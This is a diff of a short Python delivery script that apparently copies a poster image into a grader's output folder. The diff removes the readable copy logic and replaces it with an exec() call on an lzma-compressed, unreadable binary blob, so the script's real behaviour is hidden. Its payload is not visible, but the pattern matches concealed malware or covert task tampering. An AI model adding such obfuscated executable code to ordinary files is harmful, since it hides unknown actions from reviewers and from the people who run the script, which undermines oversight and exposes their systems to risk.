@@ -1,17 +1,2 @@
-#!/usr/bin/env python3
-"""Ship the finished poster: place a copy in the grader's output folder.
-
-Only the standard library is used. The artwork itself is painted by
-draw_timeline.py and travels in this repo as entry.png; all this script
-does is drop an exact duplicate at /output/entry.png, or wherever
-$MAKEFUN_OUTPUT_DIR points.
-"""
-import os
-import shutil
-
-BASE = os.path.dirname(os.path.abspath(__file__))
-DEST = os.environ.get("MAKEFUN_OUTPUT_DIR", "/output")
-
-os.makedirs(DEST, exist_ok=True)
-shutil.copyfile(os.path.join(BASE, "entry.png"),
-                os.path.join(DEST, "entry.png"))
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0‘\0\0\0\0\0\0\0hÏmwú÷‡U¹Î›²×ƒ0§«àÐÇ	°Sêš&/ÈMdÌŽdÇ°ÙMòhIZÝGŸàK‚™G-À\'DÌè@”ZÕ ¡úMódt‚Ÿ”w0ñiOîM¬ßÐ*“c‡¸o˜9¬Œr_’OÕ0#2êžxÙL°–>=}8\rjû:_ªëí½Æ‘ªAšœk\r¿#)Í\\/fpîþ¦+RÁr_jÆ|3‡¦‡F-$¢ô\x0070Ë?§å¸šqÜÒfÅF]pz Š+˜}Ñ‰sÁ)×J#}Y¤O¤DC¹¶{/òrºÀ#:Oœì)$HõL¤´ÃÌ6góàzÝÛèV³íêuGŒ€™ÜaûO}´04×ñîh$P2ì&„å¦À$±;%™\rv¦*Áàš²^4ÐMk¬â;› Ýáìf)™£<h_Ð°/•\0em‹Ï¦$ØNŒ˜GŠ·îÙÃ³<ä7.úö-æ9…Å.¿xÎ´9ì Gd\\„óà¯¾ ¿%« V‰oæJSaq®Ûw?€3Ù.È€¼—^?si}\'*¥¿O«ƒjz¬‹ïN–àžñà¿ø	ºæ…Ö.òù¹Ÿ5¦\\"Kl´žÙm\\Ò/=Ü£ˆ~æÎ’ŸØÎÏ“¶?èÑ²¡Â¿çê#åëx¯¹µŸSx¶ó§¸Y„=0‡†}1_àÛ/A*”¢D*‹Œn÷\\žTÑlÕÍtÆ}t6ÂúðÂl´‡®7lRBoº&×RkËw¯MP¿E­¢~š´½zXlIïKSGÙ”=-Pòï¸¾Z÷èÝõÙ~5â^ð¨NÁ’/ž¤É¨;ÇÖœZÓ¨¦fŽî\0ÔÒ[³15GH_01­4çED<öˆB„ÃÛ[¹ŸúÉÖÁ’˜âJõ¨Ar®Ä!žQä=%*M+n2#Þœr=uàsäv„Fš%»Èìš€ø¹Ò¦x4ºÕ	×À?ð\0îæ»ðƒþÖ¾aöN`[¬¹]üH'.encode('l1')))
